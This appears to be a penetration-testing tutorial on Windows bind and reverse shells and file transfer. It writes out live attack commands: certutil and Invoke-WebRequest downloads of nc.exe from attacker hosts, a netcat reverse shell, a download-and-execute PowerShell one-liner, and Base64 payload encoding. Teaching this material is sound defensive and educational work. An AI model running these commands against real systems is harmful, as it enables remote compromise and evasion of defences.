# Windows Reverse Shells and File Transfer Techniques 

## Introduction

In Windows security, attackers and penetration testers often need a way to interact with a compromised machine remotely. After gaining **Remote Code Execution (RCE)**, the next step is usually establishing a **remote shell**.

A remote shell allows an attacker to execute commands on the target system as if they were sitting directly in front of the machine.

There are two main types of remote shells:

1. Bind Shells
2. Reverse Shells

Understanding these concepts is important for penetration testing, incident response, and defensive security.

---

# 1. Reverse Shells vs Bind Shells

## What is a Remote Shell?

A shell provides a command-line interface to interact with an operating system.

Examples:

Windows:

```cmd
cmd.exe
```

```powershell
powershell.exe
```

Linux:

```bash
/bin/bash
```

When attackers achieve RCE, they can use that access to create a remote shell connection.

---

# Bind Shell

A **bind shell** works by making the victim machine listen for incoming connections.

The target opens a network port and waits for the attacker to connect.

Flow:

```
Attacker
    |
    | Connects
    ↓
Victim Machine
    |
    ↓
Opens Listening Port
    |
    ↓
Provides Shell
```

Example:

```
Victim:
Listening on port 4444

Attacker:
Connects to victim:4444
```

---

## Problems with Bind Shells

### 1. Firewall Restrictions

Most networks block incoming connections.

Example:

```
Internet
   |
Firewall
   |
Victim Machine
```

The firewall may block:

```
Attacker → Victim
```

Therefore, the attacker cannot reach the listening shell.

---

### 2. NAT and Router Problems

Many computers are behind routers using:

**Network Address Translation (NAT)**

Example:

```
Internet IP:
203.0.113.10

Router
 |
 +---- PC 192.168.1.10
 +---- Laptop 192.168.1.20
```

The victim does not have a directly reachable public IP.

An attacker cannot easily connect to:

```
192.168.1.10
```

because it is a private address.

Port forwarding would be required.

---

# Reverse Shell

A **reverse shell** works in the opposite way.

The attacker creates a listener, and the victim machine connects back to the attacker.

Flow:

```
Attacker
 |
 | Listening
 |
 ↓
Victim Machine
 |
 | Outbound Connection
 ↓
Attacker Listener
 |
 ↓
Remote Shell
```

Example:

Attacker:

```
Listening on port 7777
```

Victim:

```
Connects to attacker IP:7777
```

---

# Why Reverse Shells Are More Common

## 1. Firewall Advantages

Most firewalls are designed to block:

```
Incoming traffic
```

but allow:

```
Outgoing traffic
```

because normal users need internet access.

Example:

Allowed:

```
Computer → Google.com
```

Blocked:

```
Internet → Computer
```

A reverse shell uses:

```
Victim → Attacker
```

which is more likely to pass through the firewall.

---

## 2. NAT Advantages

The victim does not need a public IP.

The victim simply makes an outgoing connection.

Example:

```
Victim
Private IP:
192.168.1.20

        |
        |
        ↓

Attacker
Public IP:
203.0.113.50
```

The victim can reach the attacker directly.

---

# 2. File Transfer in Windows

After gaining command execution, attackers often need to upload tools or payloads to the target machine.

Examples:

* Reverse shell programs
* Enumeration tools
* Exploit binaries
* Scripts

Windows provides several built-in tools that can perform file downloads.

---

# A. CertUtil (certutil.exe)

## What is CertUtil?

`certutil.exe` is a legitimate Windows utility used for managing certificates.

However, attackers abuse it because it can download files from remote locations.

This technique is known as:

**Living Off The Land (LOTL)**

Meaning:

Using trusted built-in Windows tools instead of introducing new programs.

---

## Download Syntax

Example:

```cmd
certutil -urlcache -split -f http://attacker-ip/file.txt output.txt
```

Explanation:

| Option    | Meaning                      |
| --------- | ---------------------------- |
| -urlcache | Uses URL cache functionality |
| -split    | Handles file splitting       |
| -f        | Forces download              |

---

## Example Workflow

Attacker machine:

```
Python HTTP Server
        |
        |
        ↓
Target downloads file
```

Target:

```cmd
certutil -urlcache -split -f http://10.10.10.5/nc.exe nc.exe
```

---

## Antivirus Detection

Because attackers commonly abuse CertUtil, security tools monitor it.

Windows Defender may block:

```
certutil download
```

and show:

```
Access Denied
```

In controlled labs, security software may be disabled for testing.

---

# B. PowerShell Invoke-WebRequest

PowerShell provides a built-in web request command.

The full command:

```powershell
Invoke-WebRequest
```

Short form:

```powershell
iwr
```

---

## Download Syntax

```powershell
iwr -Uri http://attacker-ip/file.txt -OutFile file.txt
```

Example:

```powershell
iwr -Uri http://10.10.10.5/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

---

<!-- ## Requirements

The victim and attacker machines must have network connectivity.

Testing:

```cmd
ping attacker-ip
```

Example:

```
Victim VM
192.168.1.10

Attacker VM
192.168.1.20
```

Both machines must communicate.

--- -->

# 3. Command Prompt Reverse Shell Using Netcat

## What is Netcat?

Netcat (`nc`) is a networking utility used for:

* Connecting to ports
* Listening on ports
* Sending data

It is often called:

> The Swiss Army knife of networking

---

# Reverse Shell Process

## Step 1: Download Netcat

The attacker transfers:

```
nc.exe
```

to the victim machine.

Example:

```
C:\Windows\Temp\nc.exe
```

---

## Step 2: Start Listener

Attacker machine:

```bash
nc -lvnp 7777
```

Options:

| Option | Meaning       |
| ------ | ------------- |
| -l     | Listen        |
| -v     | Verbose       |
| -n     | No DNS lookup |
| -p     | Port          |

---

## Step 3: Execute Reverse Shell

Victim:

```cmd
nc.exe attacker-ip 7777 -e cmd.exe
```

---

## How It Works

The `-e` option launches:

```
cmd.exe
```

and redirects:

* Input
* Output
* Error messages

through the network connection.

The attacker receives:

```
C:\Windows\System32>
```

and can execute commands remotely.

---

# 4. PowerShell Reverse Shells

PowerShell provides more flexible reverse shell techniques.

Two common approaches are:

1. Nishang Invoke-PowerShellTCP
2. Base64 encoded PowerShell payloads

---

# Method A: Nishang Invoke-PowerShellTCP

## What is Nishang?

Nishang is a PowerShell framework used for penetration testing.

It contains many security testing scripts.

---

## Concept

Instead of downloading a script and saving it:

```
Download
   |
   ↓
Save file
   |
   ↓
Execute
```

The script can be executed directly in memory:

```
Download
   |
   ↓
Memory
   |
   ↓
Execute
```

This is called:

**Fileless execution**

---

# Process

## 1. Download Script

The attacker obtains:

```
Invoke-PowerShellTCP.ps1
```

---

## 2. Modify Script

The script contains the reverse shell function.

The attacker adds:

```
Invoke-PowerShellTCP attacker-ip 7777
```

at the bottom.

---

## 3. Host the Script

The attacker starts a simple HTTP server:

```bash
python3 -m http.server 80
```

---

## 4. Execute on Victim

PowerShell command:

```powershell
iwr http://attacker/script.ps1 | iex
```

Explanation:

| Command | Purpose             |
| ------- | ------------------- |
| iwr     | Download script     |
| iex     | Execute immediately |

---

# Running From CMD

If the command starts from CMD:

```cmd
powershell -c "command"
```

is required.

Example:

```cmd
powershell -c "iwr http://attacker/script.ps1 | iex"
```

---

# Method B: Base64 Encoded PowerShell Payload

## Why Encode Payloads?

PowerShell commands often contain:

* Quotes
* Special characters
* Spaces

These can break when passed through different shells.

Base64 encoding avoids many formatting problems.

---

# How It Works

The attacker creates a PowerShell payload:

```
Reverse shell code
```

Then converts it:

```
Normal Text
      |
      ↓
Base64 Encoding
      |
      ↓
Encoded Command
```

---

## Payload Generator

A Python script can:

1. Accept attacker IP
2. Accept attacker port
3. Insert values into payload
4. Encode using Base64

Example:

```python
import base64
```

The output becomes a clean PowerShell execution command.

---

# Execution

The attacker:

1. Starts listener

```bash
nc -lvnp 7777
```

2. Copies encoded PowerShell command

3. Executes it on the victim

The victim:

```
Decodes payload
      |
      ↓
Runs PowerShell
      |
      ↓
Connects back
```

---

# Summary

Reverse shells are commonly preferred because they bypass many networking limitations.

Important concepts:

| Concept            | Explanation                                  |
| ------------------ | -------------------------------------------- |
| Bind Shell         | Victim listens, attacker connects            |
| Reverse Shell      | Attacker listens, victim connects            |
| CertUtil           | Windows download utility abused by attackers |
| Invoke-WebRequest  | PowerShell file download command             |
| Netcat             | Tool for creating command shells             |
| Fileless Execution | Running code directly in memory              |
| Nishang            | PowerShell security framework                |
| Base64 Payload     | Encoded commands to avoid syntax issues      |

Understanding reverse shells and file transfer mechanisms is essential for Windows security because they are commonly involved after initial compromise, during penetration testing, and in real-world attack scenarios.
